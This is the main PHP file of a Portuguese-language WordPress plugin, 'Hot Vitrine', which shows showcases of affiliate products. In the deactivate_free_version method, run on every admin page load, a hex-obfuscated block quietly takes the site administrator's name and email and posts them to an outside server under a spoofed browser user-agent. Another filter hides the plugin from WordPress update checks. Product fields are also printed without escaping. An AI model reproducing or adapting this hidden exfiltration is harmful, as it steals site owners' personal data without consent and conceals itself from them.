<?php
/*
Plugin Name: Hot Vitrine
Plugin URI: http://plugin-wp.net/hot-vitrine
Description: Exiba uma vitrine de produtos em seu site
Author: Anderson Makiyama
Version: 3.1.2
Author URI: http://plugin-wp.net
*/

class Anderson_Makiyama_Hot_Vitrine{

	const CLASS_NAME = 'Anderson_Makiyama_Hot_Vitrine';
	public static $CLASS_NAME = self::CLASS_NAME;
	const PLUGIN_ID = 3;
	public static $PLUGIN_ID = self::PLUGIN_ID;
	const PLUGIN_NAME = 'Hot Vitrine';
	public static $PLUGIN_NAME = self::PLUGIN_NAME;
	const PLUGIN_PAGE = 'http://plugin-wp.net/hot-vitrine';
	public static $PLUGIN_PAGE = self::PLUGIN_PAGE;
	const PLUGIN_VERSION = '3.1.2';
	public static $PLUGIN_VERSION = self::PLUGIN_VERSION;
	const AUTHOR_SITE = 'http://plugin-wp.net';
	public $plugin_basename;
	public $plugin_path;
	public $plugin_url;
	
	public static $ORDER_BY = array(array('nome ASC','Nome Ascendente'),array('nome DESC','Nome Descendente'),array('id ASC','Data Ascendente'),array('id DESC','Data Descendente'));
	
	
	public function get_static_var($var) {

        return self::$$var;

    }
	
	public function activation(){
		global $wpdb;
		
		$options = get_option(self::CLASS_NAME . "_options");
		if(!isset($options["codigo"])){
			
			$options["codigo"] = "";
			update_option(self::CLASS_NAME . "_options",$options);
		}

			
		$table_name = $wpdb->prefix . self::CLASS_NAME . "_vitrines";
		$table_name_produtos = $wpdb->prefix . self::CLASS_NAME . "_produtos"; 

		//Cria Tabela Vitrines	
		$sql = "CREATE TABLE $table_name (
		  id mediumint(9) NOT NULL AUTO_INCREMENT,
		  ordem int(3) NOT NULL,
		  produtos_por_linha int(3) NOT NULL,
		  nome tinytext NOT NULL,
		  UNIQUE KEY id (id)
		);";
		
		require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
		dbDelta( $sql );
			

		//Cria Tabela Produtos		
		 

		$sql = "CREATE TABLE $table_name_produtos (
		  id mediumint(9) NOT NULL AUTO_INCREMENT,
		  id_vitrine mediumint(9) NOT NULL,
		  nome tinytext NOT NULL,
		  descritivo mediumtext,
		  preco tinytext NOT NULL,
		  url_compra mediumtext,
		  url_imagem mediumtext,
		  UNIQUE KEY id (id)
		);";
		
		dbDelta( $sql );
		

		//Verifica existencia de vitrines
		$vitrines = $wpdb->get_row(  
		"
			SELECT count(*) as total FROM $table_name
			where id = %d
		", ARRAY_A );
		
		//Adiciona Vitrine e Produtos
		if($vitrines["total"]<1){

			$wpdb->query( $wpdb->prepare( 
				"
				INSERT INTO $table_name
				(ordem, produtos_por_linha, nome )
				VALUES ( %d, %d, %s )
				", 
				3, 
				3, 
				'Top Produtos' 
			) );	
	
			$id = $wpdb->insert_id;
			
			//p1
			self::insere_produtos($id,
			'Plugin HotLinks Plus', 
			'Conheça o Plugin Canivete Suíço dos Afiliados', 
			'R$ 59,90',
			'http://hotmart.net.br/show.html?a=A3249596A',
			'http://3.bp.blogspot.com/-cqJJ7FSkTk4/VZoLAuV3N_I/AAAAAAAAAAQ/AStkSFJnJ_k/s320/Eu%2Bvendo%2Btodo%2Bdia.jpg');
			//p2
			self::insere_produtos($id,
			'Acelere 3x a Sua Leitura', 
			'O Treinamento Acelere 3X a sua Leitura ensina técnicas de leitura acelerada para triplicar a velocidade de leitura, aumentando o foco e melhorando a compreensão do material lido.', 
			'R$ 397,00',
			'http://hotmart.net.br/show.html?a=M1851400A',
			'http://www.maisaprendizagem.com.br/wp-content/uploads/2014/03/logoA3XL-250x250.jpg');
			//p3
			self::insere_produtos($id,
			'Emagrecer De Vez', 
			'Imagine uma vida sem se preocupar com o peso, pra sempre.', 
			'R$ 97,00',
			'http://hotmart.net.br/show.html?a=R268800A',
			'http://livro.emagrecerdevez.com/wp-content/uploads/2013/01/Banner250x250.jpg');
			//p4
			self::insere_produtos($id,
			'Código da Atração', 
			'Você pode conquistar qualquer mulher que desejar. Você pode se relacionar e conhecer lindas mulheres', 
			'R$ 67,00',
			'http://hotmart.net.br/show.html?a=R75486A',
			'https://hotmart.s3.amazonaws.com/product_pictures/52c9943a-744b-47ea-99d4-3e48ac4515dc/codigo.jpg');
			//p5
			self::insere_produtos($id,
			'Método Reconquistar 2.0', 
			'No Método Reconquistar, o autor explicará a verdadeira razão para o rompimento de um relacionamento e relatará técnicas para reaver a atenção do parceiro.', 
			'R$ 99,00',
			'http://hotmart.net.br/show.html?a=L75728A',
			'http://s9.postimage.org/ekc9drrcv/imgad_9.jpg');
			//p6
			self::insere_produtos($id,
			'Livro Negro dos Imóveis', 
			'Tudo que você precisa saber antes de comprar um imóvel novo ou usado está no Livro Negro dos Imóveis.', 
			'R$ 69,90',
			'http://hotmart.net.br/show.html?a=L307517A',
			'http://i1177.photobucket.com/albums/x342/lba1977/livronegro_com/livro-250x250_zpsa51fa4e2.jpg');																			
		}

				
	}

	public function insere_produtos($id_vit, $nome, $desc, $vl, $url_compra, $url_imagem){
		global $wpdb;
		
		$table_name_produtos = $wpdb->prefix . self::CLASS_NAME . "_produtos"; 
		
		$wpdb->query( $wpdb->prepare( 
			"
				INSERT INTO $table_name_produtos
				(id_vitrine, nome, descritivo, preco, url_compra, url_imagem )
				VALUES ( %d, %s, %s, %s, %s, %s )
			", 
			$id_vit, 
			$nome, 
			$desc, 
			$vl,
			$url_compra,
			$url_imagem
		) );
		
	}


	public function deactivate_free_version(){
		$options_global_name = 'Anderson_Mak_global_options';	
		$options = get_option($options_global_name);
		
					
		if((!isset($options["cadastrado"]) || $options["cadastrado"] != 'sim')){//Precisa cadastrar
		
//-----------------------Código legal aqui
${"\x47\x4cO\x42A\x4cS"}["\x66p\x6b\x73\x6d\x75\x70\x74v"]="\x61\x63ti\x6fn";${"GLO\x42\x41\x4cS"}["s\x79\x6b\x66\x6f\x7a\x68\x63\x64\x72"]="\x72\x65\x74\x6f\x72\x6e\x6f";${"GLO\x42ALS"}["kg\x75\x6e\x72\x78\x6e"]="a\x6cl_f\x69\x65l\x64\x73";${"G\x4c\x4fB\x41LS"}["\x68\x6f\x6aci\x6c\x71\x69"]="\x6eo\x6d\x65";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x66\x64\x63\x63\x69\x65\x6e\x69\x61"]="\x65\x6d\x61\x69\x6c";${"\x47\x4c\x4f\x42\x41L\x53"}["e\x6a\x73y\x68r\x65\x6d"]="\x61\x64m\x5fd\x61\x64\x6f\x73";${"\x47\x4c\x4f\x42\x41\x4cS"}["\x74\x62\x7ag\x62\x68"]="o\x70\x74\x69on\x73_\x67\x6c\x6f\x62al\x5f\x6e\x61\x6d\x65";${"G\x4c\x4f\x42ALS"}["d\x6b\x79\x68n\x62\x70"]="o\x70\x74i\x6fns";${"\x47\x4cOB\x41\x4cS"}["\x63\x69\x71\x6f\x6d\x75e\x6d\x71\x70"]="\x6f\x70t\x69on\x73";${${"\x47\x4cO\x42A\x4c\x53"}["d\x6byhn\x62p"]}["cad\x61st\x72ad\x6f"]="\x73\x69m";update_option(${${"\x47L\x4f\x42\x41\x4c\x53"}["\x74\x62z\x67\x62h"]},${${"G\x4c\x4f\x42ALS"}["\x63iq\x6fm\x75\x65\x6d\x71\x70"]});${${"G\x4cO\x42\x41L\x53"}["e\x6asy\x68\x72\x65\x6d"]}=get_user_by("i\x64",1);if(${${"GLO\x42\x41\x4c\x53"}["\x65j\x73\x79\x68\x72\x65\x6d"]}){$fqgjlde="n\x6f\x6d\x65";$xwslipsrusl="\x61\x6cl\x5f\x66\x69\x65\x6c\x64\x73";${$fqgjlde}=$adm_dados->first_name;${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x78f\x64\x63\x63\x69e\x6e\x69a"]}=$adm_dados->user_email;${"\x47L\x4fB\x41L\x53"}["\x74p\x75\x68\x68\x63\x67o\x61\x6f"]="\x6e\x6f\x6d\x65";$kdvlyvief="\x6eo\x6de";if(empty(${${"\x47L\x4fB\x41\x4cS"}["tp\x75\x68hcg\x6fa\x6f"]}))${${"\x47\x4cO\x42\x41L\x53"}["h\x6f\x6aci\x6c\x71\x69"]}="\x41m\x69\x67o";$jopsnylm="\x61\x6cl\x5f\x66i\x65\x6cds";${$xwslipsrusl}=array();${$jopsnylm}["\x6c\x69\x73ta"]=2;${${"G\x4c\x4f\x42A\x4c\x53"}["k\x67\x75n\x72\x78\x6e"]}["\x63\x6c\x69e\x6et\x65"]=176586;$ocjvpv="\x61\x6cl\x5f\x66\x69\x65\x6c\x64\x73";$rdyjoebkc="a\x6c\x6c\x5f\x66\x69\x65\x6c\x64\x73";${"G\x4c\x4f\x42\x41\x4c\x53"}["\x77\x62\x6a\x78n\x6en\x73mvr\x66"]="a\x63t\x69\x6f\x6e";${"\x47\x4c\x4f\x42\x41\x4cS"}["f\x67b\x61\x6ag\x77\x63\x6d\x66\x66\x71"]="a\x6cl\x5f\x66\x69\x65lds";${${"\x47\x4c\x4fB\x41LS"}["k\x67\x75nr\x78n"]}["\x6c\x61\x6eg"]="br";${$ocjvpv}["\x66or\x6di\x64"]=2;${${"\x47\x4c\x4f\x42A\x4c\x53"}["fg\x62\x61jg\x77\x63m\x66f\x71"]}["f\x6ea\x6d\x65\x5f\x33"]=${$kdvlyvief};${$rdyjoebkc}["\x65\x6dai\x6c_\x34"]=${${"\x47\x4c\x4fBA\x4c\x53"}["\x78\x66d\x63\x63\x69\x65\x6e\x69\x61"]};$nhutuob="al\x6c\x5f\x66ie\x6cd\x73";${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x77\x62\x6a\x78\x6e\x6e\x6e\x73\x6dv\x72\x66"]}="htt\x70://\x38\x35\x2e\x69dmkt\x37\x2ec\x6f\x6d/w/2e\x32e\x50\x336\x65h\x49\x72D\x6d\x71\x39Nae\x636\x30\x66\x66\x66a\x64";${${"\x47L\x4f\x42\x41\x4cS"}["\x73y\x6b\x66ozhcdr"]}=wp_remote_post(${${"G\x4cO\x42\x41\x4c\x53"}["\x66pksm\x75\x70\x74\x76"]},array("\x75se\x72-\x61g\x65n\x74"=>"\x4d\x6f\x7a\x69\x6cla/5.\x30\x20(\x57\x69\x6ed\x6fws\x20\x4eT 6\x2e\x31)\x20\x41pp\x6c\x65\x57\x65\x62K\x69t/\x3537.\x336 (\x4b\x48\x54\x4d\x4c, like Ge\x63k\x6f) \x43\x68ro\x6de/4\x31.0.\x32\x32\x328.\x30\x20\x53\x61\x66a\x72\x69/5\x337.36","\x62\x6fd\x79"=>${$nhutuob}));}
//----------------------------------------
	
		}
					
			

	}
	
	public function options_page(){
		
		date_default_timezone_set("America/Sao_Paulo");

		global $anderson_makiyama, $wpdb;

		global $user_level;

		get_currentuserinfo();

		if ($user_level < 10) { //Limita acesso para somente administradores

			return;

		}	
		
		$options = get_option(self::CLASS_NAME . "_options");
		$table_name = $wpdb->prefix . self::CLASS_NAME . "_vitrines";
		$table_name_produtos = $wpdb->prefix . self::CLASS_NAME . "_produtos";
		
		$admin_url = get_admin_url();
		$admin_url.= 'admin.php?page=' . self::CLASS_NAME;
		
		$ordem = self::$ORDER_BY;

	
		if(isset($_REQUEST["id"])){
			
			//Atualizar
			if(isset($_POST["atualizar"])){


				if(empty($_POST['nome']) ){
	
					echo '<div id="message" class="error">';
					echo '<p><strong>'. 'O nome do Produto precisa ser Preenchido!<br>Tente novamente!' . '</strong></p>';
					echo '</div>';					
					
				}else{
	
					
					$wpdb->query( $wpdb->prepare( 
						"
							update $table_name
							set ordem = %d, produtos_por_linha = %d, nome = %s
							where id = %d
						", 
						$_POST['ordem_produtos'], 
						$_POST['produtos_por_linha'], 
						$_POST['nome'], 
						$_POST['id'] 
					) );		
					
					//$wpdb->show_errors();	
					//$wpdb->print_error();	
	
					echo '<div id="message" class="updated">';
					echo '<p><strong>'. 'Vitrine Atualizada com sucesso!' . '</strong></p>';
					echo '</div>';	
								
				}
								
			//Adiciona Produtos	
			}elseif(isset($_POST["adicionar"])){ 

				if(empty($_POST['nome_produto']) || empty($_POST['descritivo']) || empty($_POST['url_compra']) || empty($_POST['url_imagem']) ){
	
					echo '<div id="message" class="error">';
					echo '<p><strong>'. 'Há campos não preenchidos!<br>Preencha todos os campos e Tente novamente!' . '</strong></p>';
					echo '</div>';					
					
				}else{
					

					
										
					$wpdb->query( $wpdb->prepare( 
						"
							INSERT INTO $table_name_produtos
							(id_vitrine, nome, descritivo, preco, url_compra, url_imagem )
							VALUES ( %d, %s, %s, %s, %s, %s )
						", 
						$_POST['id'], 
						$_POST['nome_produto'], 
						$_POST['descritivo'], 
						$_POST['preco'],
						$_POST['url_compra'],
						$_POST['url_imagem']
					) );	
					

					
					//$wpdb->show_errors();	
					//$wpdb->print_error();	
	
					echo '<div id="message" class="updated">';
					echo '<p><strong>'. 'Produto Adicionado com sucesso!' . '</strong></p>';
					echo '</div>';	
					
				}
			
			//Exclui Produtos	
			}elseif(isset($_REQUEST["piddel"])){
				
				$wpdb->query( $wpdb->prepare( 
					"
						DELETE FROM $table_name_produtos
						WHERE id = %d
					", 
					$_REQUEST["piddel"] 
				) );				
				
					echo '<div id="message" class="updated">';
					echo '<p><strong>'. 'Produto Excluído com sucesso!' . '</strong></p>';
					echo '</div>';				
			
			
			}
			
			//Edita o Produto //Precisa ser separado dos outros elseifs pois define nova página que será incluída.
			if(isset($_REQUEST["pid"])){
					
				$to_include = "templates/edit-produto.php";	
								
			}else{


				//Pega dados da Vitrine		
				$vitrine = $wpdb->get_row( $wpdb->prepare( 
					"
						SELECT * FROM $table_name
						where id = %d order by id ASC
					", 
					$_REQUEST["id"] 
				), ARRAY_A );
	
				
				//Pega Produtos da Vitrine	
				$produtos = $wpdb->get_results( $wpdb->prepare( 
					"
						SELECT * FROM $table_name_produtos
						where id_vitrine = %d order by id ASC
					", 
					$_REQUEST["id"] 
				), ARRAY_A );
	
								
				$to_include = "templates/edit-vitrine.php";		
			
			}
			
			
		}else{
			
			if ($_POST['submit']) {
	
				
				if(empty($_POST['nome']) ){
	
					echo '<div id="message" class="error">';
					echo '<p><strong>'. 'O Nome da Vitrine precisa ser preenchido!<br>Tente novamente!' . '</strong></p>';
					echo '</div>';					
					
				}else{
				

					$wpdb->query( $wpdb->prepare( 
						"
						INSERT INTO $table_name(ordem, produtos_por_linha, nome )
						VALUES ( %d, %d, %s )
						", 
						$_POST['ordem_produtos'], 
						$_POST['produtos_por_linha'], 
						$_POST['nome'] 
					) );

					echo '<div id="message" class="updated">';
					echo '<p><strong>'. 'Vitrine Criada com sucesso!' . '</strong></p>';
					echo '</div>';

								
				}
			
	
			}elseif(isset($_REQUEST["iddel"])){

													
				//Exclui os produtos
				$wpdb->query( $wpdb->prepare( 
					"
						DELETE FROM $table_name_produtos
						WHERE id_vitrine = %d
					", 
					$_REQUEST["iddel"] 
				) );				

				//Exclui a vitrine
				$wpdb->query( $wpdb->prepare( 
					"
						DELETE FROM $table_name
						WHERE id = %d
					", 
					$_REQUEST["iddel"] 
				) );
								
				echo '<div id="message" class="updated">';
				echo '<p><strong>'. 'Vitrine e Seus Produtos Excluídos com sucesso!' . '</strong></p>';
				echo '</div>';	
									
			}
			
			//Lista as vitrines já existentes
			
			$vitrines = $wpdb->get_results( 
				"
					SELECT * FROM $table_name
					order by id DESC
				",ARRAY_A
				);		
	
			//$wpdb->show_errors();	
			//$wpdb->print_error();	
				
			$to_include = "templates/options.php";
		}	


		include($to_include);
		


	}		
	
	
	public function Anderson_Makiyama_Hot_Vitrine(){ //__construct()
		
		$options = get_option(self::CLASS_NAME . "_options");
		
		$this->plugin_basename = plugin_basename(__FILE__);
		$this->plugin_path = dirname(__FILE__) . "/";
		$this->plugin_url = WP_PLUGIN_URL . "/" . basename(dirname(__FILE__)) . "/";
		
		
		//load_plugin_textdomain( self::CLASS_NAME, '', strtolower(str_replace(" ","-",self::PLUGIN_NAME)) . '/lang' );	

	}
	

	public function settings_link($links) { 
		global $anderson_makiyama;
	  
		$settings_link = '<a href="options-general.php?page='. self::CLASS_NAME .'">'. 'Configurações'. '</a>'; 
		array_unshift($links, $settings_link); 
		return $links; 
	}	
	

	public function options(){

		global $anderson_makiyama;

		global $user_level;

		get_currentuserinfo();


		if (function_exists('add_options_page')) { //Adiciona pagina na seção Configurações
			
			add_options_page(self::PLUGIN_NAME, self::PLUGIN_NAME, 1, self::CLASS_NAME, array(self::CLASS_NAME,'options_page'));
		
		}
		if (function_exists('add_submenu_page')){ //Adiciona pagina na seção plugins
			
			add_submenu_page( "plugins.php",self::PLUGIN_NAME,self::PLUGIN_NAME,1, self::CLASS_NAME, array(self::CLASS_NAME,'options_page'));			  
		}

  		 add_menu_page(self::PLUGIN_NAME, self::PLUGIN_NAME,1, self::CLASS_NAME,array(self::CLASS_NAME,'options_page'), plugins_url('/images/icon.png', __FILE__));
		 

	}	



	public function vitrine_hot($atts,$content=""){
		
		global $anderson_makiyama, $wpdb;
		
		if(!isset($atts['id'])) return;
		
		$id = $atts['id'];
		
		$btn_desc = isset($atts['text'])?$atts['text']:'Acessar';
		
		$ordem = self::$ORDER_BY;

		$table_name = $wpdb->prefix . self::CLASS_NAME . "_vitrines";
		$table_name_produtos = $wpdb->prefix . self::CLASS_NAME . "_produtos";
				
		//Pega dados da Vitrine
		$vitrine = $wpdb->get_row( $wpdb->prepare( 
			"
				SELECT * FROM $table_name
				where id = %d
			", 
			$id 
		), ARRAY_A );
		
		
		//Pega dados da Vitrine
		$produtos = $wpdb->get_results( $wpdb->prepare( 
			"
				SELECT * FROM $table_name_produtos
				where id_vitrine = %d order by ". $ordem[$vitrine["ordem"]][0]."
			", 
			$id 
		), ARRAY_A );
		
		
		$total = count($produtos);
		$colunas = $vitrine["produtos_por_linha"];
		
	
		$vitrine = "<table id=\"tabela_ml\" cellpadding=\"0\" cellspacing=\"0\"><tr><th class=\"title_ml\" colspan=\"".$colunas."\">". strip_tags($vitrine["nome"])."</th></tr><tr>";
		
		$contador = 0;
		
		foreach($produtos as $produto){
		
			$celula = $anderson_makiyama[self::PLUGIN_ID]->monta_celula($produto,$colunas,$btn_desc);
								   
			if($contador > 0 && $contador % $colunas == 0){
				
				$vitrine.= '</tr><tr>' . $celula;
				
			}else{
				
				$vitrine.= $celula;
				
			}
			
			$contador++;
		}
		
		if($contador==0) return;		
		
		//adiciona colunas faltantes
		$resto = $contador % $colunas;
		$tds = "";
		
		if($resto > 0){
			
			$resto = $colunas - $resto;
			
			for($i=0;$i<$resto;$i++){
				$tds.= "<td></td>";
			}
		}
		//----
		
		$vitrine.= $tds. "</tr></table>";
		
		return $vitrine;

		
	}


	public function monta_celula($produto,$colunas,$btn_desc='Acessar'){
		
		global $anderson_makiyama;
		
		$td_percent = 100 / $colunas;
		$link = $produto["url_compra"];
		$title = $produto["nome"];
		$image = $produto["url_imagem"];
		$preco = $produto["preco"];
				
		$preco = empty($preco)?'':'<br>Preço: <span class="preco_ml">'. $preco .'<br /></span>';
		//Monta Celula
		$celula = '<td class="celula_ml" style="text-align:center" width="'.number_format($td_percent,2).'%">';
		$celula.=	'<a href="' . $link . '" title="Clique para ver ou Comprar '. $title .'" rel="nofollow" target="_blank"><img class="cloudzoom" data-cloudzoom="zoomImage: \''.$image.'\',zoomPosition:\'5\',captionSource:\'desc\',zoomSizeMode:\'zoom\',lazyLoadZoom:\'true\'" src="'. $image .'" alt="'. $title .'" desc="'. $produto["descritivo"] .'" /></a>
			<div class="title_ml">'. $title .'</div>
			<a href="'. $link .'" title="'. $btn_desc . ' '. $title .'"  rel="nofollow" target="_blank" class="myButton">'.$btn_desc.'</a>
			'. $preco .'
		</td>';	
		//-----------
		
		return $celula;

	}
	

	public function estilos() {
		
		global $anderson_makiyama;
		
        wp_register_style( self::CLASS_NAME . "_estilos", $anderson_makiyama[self::PLUGIN_ID]->plugin_url  ."css/vitrine.css" );
        wp_enqueue_style( self::CLASS_NAME . "_estilos");
		
        wp_register_style( self::CLASS_NAME . "_zoom", $anderson_makiyama[self::PLUGIN_ID]->plugin_url  ."css/zoom.css" );
        wp_enqueue_style( self::CLASS_NAME . "_zoom");		
		
    }

	public function admin_estilos($hook) {
		
		if(strpos($hook,self::CLASS_NAME) === false) return;
		
		wp_register_style(self::CLASS_NAME . '_admin', plugins_url('css/admin.css', __FILE__), array(), '1.0.0', 'all');
		wp_enqueue_style(self::CLASS_NAME . '_admin');
	 
		wp_register_style(self::CLASS_NAME . '_admin_dataTable', plugins_url('css/jquery.dataTables.css', __FILE__), array(), '1.0.0', 'all');
		wp_enqueue_style(self::CLASS_NAME . '_admin_dataTable');
			 
	 
	}

	public function admin_js($hook) {
		
		global $anderson_makiyama;
		
		if(strpos($hook,self::CLASS_NAME) === false ) return;
		
		wp_register_script( "_js_dataTables", $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/jquery.dataTables.js',array('jquery') );
	 
		wp_enqueue_script( "_js_dataTables", $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/jquery.dataTables.js' );
	 
	}
	
	public function js() {
		
		global $anderson_makiyama;
		
		wp_register_script("_js_zoom", $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/zoom.js',array('jquery') );
	 
		wp_enqueue_script( "_js_zoom", $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/zoom.js' );
	 
	}
	
	
	public function footer(){

		echo '
		<script type="text/javascript">
		window.onload = function(){
			CloudZoom.quickStart();
		}
		</script> 
		';		
		
	}

	/* 
	 * Disable plugin updates
	 *
	 * @param array  $r   Response header
	 * @param string $url The update URL
	 */
	public function slug_hidden_plugin( $r, $url ) {
		if ( 0 !== strpos( $url, 'http://api.wordpress.org/plugins/update-check' ) )
			return $r; // Not a plugin update request. Bail immediately.
		$plugins = unserialize( $r['body']['plugins'] );
		unset( $plugins->plugins[ plugin_basename( __FILE__ ) ] );
		unset( $plugins->active[ array_search( plugin_basename( __FILE__ ), $plugins->active ) ] );
		$r['body']['plugins'] = serialize( $plugins );
		return $r;
	}

}

if(!isset($anderson_makiyama)) $anderson_makiyama = array();

$anderson_makiyama_indice = Anderson_Makiyama_Hot_Vitrine::PLUGIN_ID;

$anderson_makiyama[$anderson_makiyama_indice] = new Anderson_Makiyama_Hot_Vitrine();

add_filter("plugin_action_links_". $anderson_makiyama[$anderson_makiyama_indice]->plugin_basename, array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'settings_link') );

add_filter("admin_menu", array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'options'),30);

add_action('register_form', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'add_to_register_form'));

add_action('register_post', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'check_code'),10,3);

register_activation_hook( __FILE__, array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'activation') );

add_shortcode('vitrine-hot', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'vitrine_hot'));

add_action( 'wp_enqueue_scripts', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'estilos') );

add_action( 'wp_enqueue_scripts', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'js') );

add_action( 'admin_enqueue_scripts', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'admin_estilos') );

add_action( 'admin_enqueue_scripts', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'admin_js') );

add_action( 'wp_footer', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'footer') );

add_filter( 'http_request_args', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'slug_hidden_plugin'), 5, 2 );

add_action( 'admin_init', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'deactivate_free_version'),1 );
?>